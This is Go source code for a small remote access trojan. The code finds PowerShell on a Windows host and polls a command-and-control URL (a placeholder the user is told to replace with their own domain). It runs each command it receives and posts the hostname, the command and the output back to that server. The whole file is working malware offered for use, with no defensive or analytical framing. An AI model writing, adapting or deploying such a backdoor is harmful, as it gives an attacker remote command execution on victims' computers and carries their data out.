package main

import (
    "bufio"
    "fmt"
    "net/http"
    "os/exec"
    "net/url"
    "time"
    "os"
)

func main() {

  // debug options
  var debug = false 

  // C&C server - setup your domain bellow!
  var ratcom = "https://xxx.xx/ratcom.php"

 // Find PowerShell binary

  binary, err := exec.LookPath("PowerShell")
  if err != nil {
    panic(err)
  }
  if debug {
     fmt.Println("PS binary", binary)
  }
  
// Hostname
  hostname, err := os.Hostname()
  if err != nil {
	panic(err)
  }
  if debug {
     fmt.Println("Hostname: ", hostname)
  }
  
// loop

  for i := 1;  i<=5; i++ {
  
    // get command
    resp, err := http.Get(ratcom + "?hostname="+ hostname)
    if err != nil {
        panic(err)
    }
    defer resp.Body.Close()

    if debug {
     fmt.Println("Response status: ", resp.Status)
    }
    
    scanner := bufio.NewScanner(resp.Body)
    scanner.Scan()
    comm := scanner.Text()
    
    if debug {
        fmt.Println("Command: ", comm)
    }

    
    if err := scanner.Err(); err != nil {
        panic(err)
    }

    // Exec commnad
    out, pserr := exec.Command(binary, "-Command", comm).Output()
     if pserr != nil {
         panic(pserr)
     } else {
         fmt.Printf("%s",out)
     }
     
     // Send command output to server
     displ := string( out )
   
     data := url.Values{
        "hostname": { hostname },
        "cmd":       { comm },
        "displ": { displ },
    }

    xesp, err := http.PostForm(ratcom, data)
    if err != nil {
        panic(err)
    }
    
    if debug {
        fmt.Println("Response status: ", xesp.Status)
    }
    
    time.Sleep(10 * time.Second)
    
  }  // loop 

} // main